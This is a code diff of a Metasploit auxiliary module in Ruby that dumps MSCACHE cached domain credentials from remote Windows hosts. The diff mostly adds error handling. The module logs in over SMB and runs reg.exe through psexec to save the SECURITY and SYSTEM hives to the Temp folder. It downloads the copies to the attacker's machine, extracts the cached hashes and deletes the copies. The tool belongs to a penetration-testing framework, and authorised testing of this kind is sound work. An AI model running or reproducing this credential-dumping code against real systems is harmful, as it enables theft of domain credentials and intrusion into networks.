@@ -83,12 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 		# Permutation matrix for boot key
 		@perm = [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
 			0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]	
-
-	end
-
-
-	def run_host(ip)
-		
+			
 		@credentials = Rex::Ui::Text::Table.new(
 		'Header'    => "MSCACHE Credentials",
 		'Indent'    => 1,
@@ -109,84 +104,108 @@ class Metasploit3 < Msf::Auxiliary
 			"Primary Group",
 			"Additional Groups"
 		])
-	
-		::FileUtils.mkdir_p(@logdir) unless ::File.exists?(@logdir)
-		datastore['RHOST'] = ip
-		smbshare = datastore['SMBSHARE']
-		secpath = "#{Rex::Text.rand_text_alpha(20)}"
-		syspath = "#{Rex::Text.rand_text_alpha(20)}"
-		hives = [secpath, syspath]
-		command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SECURITY C:\\WINDOWS\\Temp\\#{secpath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath}"
-		cleanup = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C del C:\\WINDOWS\\Temp\\#{secpath} C:\\WINDOWS\\Temp\\#{syspath}"
 
+	end
+
+
+	def run_host(ip)
+		#datastore['RHOST'] = ip
+		@secpath = "#{Rex::Text.rand_text_alpha(20)}"
+		@syspath = "#{Rex::Text.rand_text_alpha(20)}"
+		::FileUtils.mkdir_p(@logdir) unless ::File.exists?(@logdir)
+		hives = [@secpath, @syspath]
+		smbshare = datastore['SMBSHARE']
+		
+		#Try and Connect to the target
 		begin
 			connect()
-			if !smb_login()
-				print_error("Error connecting to #{ip}")
-			end
-			print_status("Mounting the remote share \\\\#{datastore['RHOST']}\\#{datastore['SMBSHARE']}'...")
+		rescue StandardError => connecterror
+			print_error("Unable to connect to #{ip} check your connectivity.") 
+			print_error("#{connecterror.class}: #{connecterror}")
+			disconnect()
+			return
+		end
 
-      			#--------------------------------------------------------------------------------------
-      			# Try to use reg.exe to save a copy of the SAM, SECURITY, and SYSTEM hives to C:\Windows\Temp
-     	 		#--------------------------------------------------------------------------------------
-			if self.simple.connect(smbshare)
-				vprint_status("Copying hive files to the remote system temp directory on #{ip}")
-				psexec(smbshare, command)
-				
-				#--------------------------------------------------------------------
-				# Now that hives are stored in C:\Windows\Temp\* let's download them
-				#--------------------------------------------------------------------				
-				self.simple.connect(smbshare)
-				print_status("Downloading hive files from #{ip}")
-				hives.each { |hive| 
-					copy_hives(smbshare, hive, ip) 
-				}
-				simple.disconnect(smbshare)
-			
-				#---------------------------------
-				#Time to clean up after ourselves
-				#---------------------------------
-				self.simple.connect(smbshare)
-				psexec(smbshare, cleanup)
-			else	
-				print_error("Could not mount share #{datastore['SMBSHARE']} You might not have local admin on the target system")
-			end
+		#Try and authenticate with given credentials
+		begin
+			smb_login()
+		rescue StandardError => autherror
+			print_error("Unable to authenticate to #{ip} check your credentials.")
+			print_error("#{autherror.class}: #{autherror}")
+			disconnect()
+			return
+		end
+		
+		begin
+			simple.connect(smbshare)
+			save_reg_hives(smbshare, ip)
+			print_status("Downloading SYSTEM and SECURITY hive files from #{ip}")
+			hives.each { |hive| 
+				download_hives(smbshare, hive, ip) 
+			}
 			open_hives(@logdir, ip, hives)
 			dump_cache_creds(@sec, @sys, ip)
+			simple.connect(smbshare)
+			cleanup_after(smbshare, ip)
 			disconnect()
-		rescue
-			#--------------
-			# Do Something
-			#--------------
+		rescue StandardError => bang
+			disconnect()
+			return
 		end
 	end
+
+
+
+	#--------------------------------------------------------------------------------------------------------
+	# This method attempts to use reg.exe to generate copies of the SYSTEM, and SECURITY registry hives
+	# and store them in the Windows Temp directory on the remote host
+	#--------------------------------------------------------------------------------------------------------
+	def save_reg_hives(smbshare, ip)
+		print_status("Creating hive copies on #{ip}")
+		begin
+			# Try to save the hive files
+			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SECURITY C:\\WINDOWS\\Temp\\#{@secpath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{@syspath}"
+			psexec(smbshare, command)
+		rescue StandardError => saveerror
+			print_error("Unable to create hive copies on #{ip}")
+			print_error("#{saveerror.class}: #{saveerror}")
+			disconnect()
+			return saveerror
+		end
+	end
+
 
 
 	#-----------------------------------------------------------------------------
 	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
 	# To the local file path specified in datastore['LOGDIR'] on attacking system
 	#-----------------------------------------------------------------------------
-	def copy_hives(smbshare, hive, ip )
-		newdir = "#{@logdir}/#{ip}"
-		::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
-		simple.connect("\\\\#{ip}\\#{smbshare}")
-		#--------------------------
-		#Get contents of hive file
-		#--------------------------
-		vprint_status("Downloading #{hive}")
-		remotesam = simple.open("\\WINDOWS\\Temp\\#{hive}", 'rob')		
-		data = remotesam.read
-	
-		#-----------------------------
-		#Save it to local file system
-		#-----------------------------
-		file = File.open("#{@logdir}/#{ip}/#{hive}", "w+")
-		file.write(data)
-
-		file.close
-		remotesam.close
+	def download_hives(smbshare, hive, ip )
+		begin
+			newdir = "#{@logdir}/#{ip}"
+			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
+			simple.connect("\\\\#{ip}\\#{smbshare}")
+			
+			# Get contents of hive file
+			remotesam = simple.open("\\WINDOWS\\Temp\\#{hive}", 'rob')		
+			data = remotesam.read
+			
+			# Save it to local file system
+			file = File.open("#{@logdir}/#{ip}/#{hive}", "w+")
+			file.write(data)
+			
+			file.close
+			remotesam.close
+			simple.disconnect("\\\\#{ip}\\#{smbshare}")
+		rescue StandardError => hive_error
+			print_error("Unable to download hive copies from #{ip}.")
+			print_error("#{hive_error.class}: #{hive_error}")
+			disconnect()
+			return hive_error
+		end
 	end
 
+	
 	
 	#-------------------------------------------------------------------------------------------------------
 	# This method should hopefully open up a hive file from yoru local system and allow interacting with it
@@ -195,6 +214,23 @@ class Metasploit3 < Msf::Auxiliary
 		@sys = Rex::Registry::Hive.new("#{path}/#{ip}/#{hives[1]}")
 		@sec = Rex::Registry::Hive.new("#{path}/#{ip}/#{hives[0]}")
 	end
+	
+	
+	
+	def cleanup_after(smbshare, ip)
+		print_status("Running cleanup on #{ip}")
+		begin
+			# Try and do cleanup
+			cleanup = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C del C:\\WINDOWS\\Temp\\#{@secpath} C:\\WINDOWS\\Temp\\#{@syspath}"
+			psexec(smbshare, cleanup)
+		rescue StandardError => cleanerror
+			print_error("Unable to run cleanup, need to manually remove hive copies from windows temp directory.")
+			print_error("#{cleanerror.class}: #{cleanerror}")
+			disconnect()
+			return cleanerror
+		end
+	end
+	
 	
 	
 	def dump_cache_creds(sec, sys, ip)
@@ -251,11 +287,8 @@ class Metasploit3 < Msf::Auxiliary
 				vprint_status("Hash are in MSCACHE format. (mscash)")
 			end
 
-		rescue ::Interrupt
-			raise $!
-		rescue ::Rex::Post::Meterpreter::RequestError => e
-			print_error("Meterpreter Exception: #{e.class} #{e}")
-			print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
+		rescue StandardError => e
+			print_status("No cached hashes found on #{ip}")
 		end
 
 	end
@@ -572,7 +605,6 @@ class Metasploit3 < Msf::Auxiliary
 			@vista = 0
 		rescue 
 			enc_reg_key = sec.relative_query('\Policy\PolEKList')
-			puts "got here"
 			obf_lsa_key = enc_reg_key.value_list.values[0].value.data 
 			@vista = 1
 		end
